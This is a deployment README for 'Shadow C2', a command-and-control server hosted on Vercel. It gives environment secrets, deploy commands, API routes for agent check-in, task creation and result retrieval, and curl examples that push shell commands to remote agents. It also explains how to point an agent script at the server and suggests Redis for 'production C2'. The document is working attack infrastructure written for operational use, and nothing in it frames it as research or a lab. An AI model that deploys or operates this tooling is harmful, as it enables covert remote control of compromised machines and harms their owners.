# Shadow C2 — Vercel Deployment

## Secrets (Environment Variables)
Set these in Vercel Dashboard → Settings → Environment Variables:

| Key | Value |
|-----|-------|
| `C2_SECRET_KEY` | `TT_C2_RENDER_SECRET` |
| `C2_STATIC_SEED` | `TT_C2_RENDER_SECRET` |

## Deploy
```bash
cd /tmp/c2-vercel
chmod +x deploy.sh
./deploy.sh shadow-c2
```

Or manually:
```bash
vercel login
vercel --prod -n shadow-c2
```

## API Endpoints
```
GET  https://<project>.vercel.app/                     → Health
POST https://<project>.vercel.app/?route=checkin       → Agent checkin (returns pending task)
POST https://<project>.vercel.app/?route=result        → Submit task result
POST https://<project>.vercel.app/?route=agents        → List agents
POST https://<project>.vercel.app/?route=task          → Create task for agent
POST https://<project>.vercel.app/?route=stats         → Statistics
POST https://<project>.vercel.app/?route=delete_agent  → Delete agent
```

## Auth
All routes require `"key": "TT_C2_RENDER_SECRET"` in the JSON body.

## Issue Commands
```bash
# Send shell command to agent
curl -X POST "https://<project>.vercel.app/?route=task" \
  -H "Content-Type: application/json" \
  -d '{"key":"TT_C2_RENDER_SECRET","agent_id":"AGENT_ID","action":"shell","args":{"cmd":"whoami"}}'

# Get result
curl -X POST "https://<project>.vercel.app/?route=get_result" \
  -H "Content-Type: application/json" \
  -d '{"key":"TT_C2_RENDER_SECRET","task_id":"task_000001"}'

# List agents
curl -X POST "https://<project>.vercel.app/?route=agents" \
  -H "Content-Type: application/json" \
  -d '{"key":"TT_C2_RENDER_SECRET"}'
```

## Update Agent
After deploy, update `agent_http.py`:
```python
C2_URL = "https://<project>.vercel.app"
```

## ⚠️ Vercel Limitations
- **SQLite is ephemeral** — resets on cold start (no persistence across invocations)
- **10s timeout** on Hobby plan — long tasks will fail
- **Rate limits** — 100 req/min on Hobby

For production C2, use Vercel KV (Redis) instead of SQLite.
